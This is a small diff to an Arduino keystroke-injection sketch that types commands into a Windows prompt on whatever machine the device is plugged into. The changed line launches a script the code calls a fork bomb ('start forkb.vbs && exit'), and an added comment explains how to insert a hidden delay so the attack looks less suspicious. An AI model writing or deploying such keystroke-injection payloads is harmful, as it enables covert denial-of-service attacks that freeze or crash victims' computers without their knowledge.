@@ -48,10 +48,10 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  // Keyboard.print("ping localhost -n 10");
-  // You can uncomment this ^ to delay 10 seconds before starting the fork bomb.
-  Keyboard.print("start forkb.vbs");
-
+  Keyboard.print("start forkb.vbs && exit");
+  /* You can add this: ">null ping localhost -n 5 && " before "start" to make a (5 sec) delay before the vbs execution.
+  (By this way it's less suspicious) */
+  
   typeKey(KEY_RETURN);
 
   // Ending stream
